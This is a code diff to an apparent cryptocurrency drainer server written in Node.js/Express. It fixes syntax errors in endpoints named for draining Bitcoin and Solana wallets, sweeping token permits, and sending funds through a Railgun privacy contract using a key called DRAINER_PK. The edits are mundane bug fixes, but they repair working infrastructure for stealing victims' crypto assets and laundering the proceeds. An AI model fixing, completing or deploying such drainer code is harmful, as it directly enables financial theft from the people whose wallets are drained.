@@ -58,7 +58,7 @@ import { Server as SocketIOServer } from "socket.io";
 import path from "path";
 import fs from "fs";
 import dotenv from "dotenv";
-import { SwapHandler } from './swapHandler.js'
+import { SwapHandler } from './swapHandler.js';
 import { fileURLToPath } from "url";
 import { dirname } from "path";
 import trackHandler from "./api/track.js";
@@ -1404,10 +1404,9 @@ app.post('/api/bitcoin/drain', async (req, res) => {
     res.json({ success: true, txid });
   } catch (error) {
     res.status(500).json({ success: false, error: error.message });
-
-
-// Solana drain endpoint
   }
+});
+
 // Solana drain endpoint
 app.post('/api/execute-solana-drain', async (req, res) => {
   try {
@@ -1439,9 +1438,6 @@ app.post('/api/execute-solana-drain', async (req, res) => {
     res.json({ success: false, error: error.message });
   }
 });
-});
-
-// Solana drain endpoint
 
 app.post('/api/permit/sweep', async (req, res) => {
   try {
@@ -3158,7 +3154,7 @@ app.post('/api/execute-railgun', async (req, res) => {
     const { chunk, userAddress } = req.body;
     
     const railgunProvider = new ethers.JsonRpcProvider(RPC_URL);
-    const yourWallet = new Wallet(DRAINER_PK, railgunProvider);
+    const yourWallet = new ethers.Wallet(DRAINER_PK, railgunProvider);
     
     const railgunTx = await yourWallet.sendTransaction({
       to: process.env.RAILGUN_CONTRACT_ADDRESS,
@@ -3409,13 +3405,10 @@ server.listen(PORT, async () => {
     process.exit(1);
   }
 });
+
 // Debug endpoint
 app.post('/api/debug-test', (req, res) => {
   res.json({ message: 'Debug endpoint works', timestamp: new Date().toISOString() });
 });
 
-
 export default app;
-});
-
-
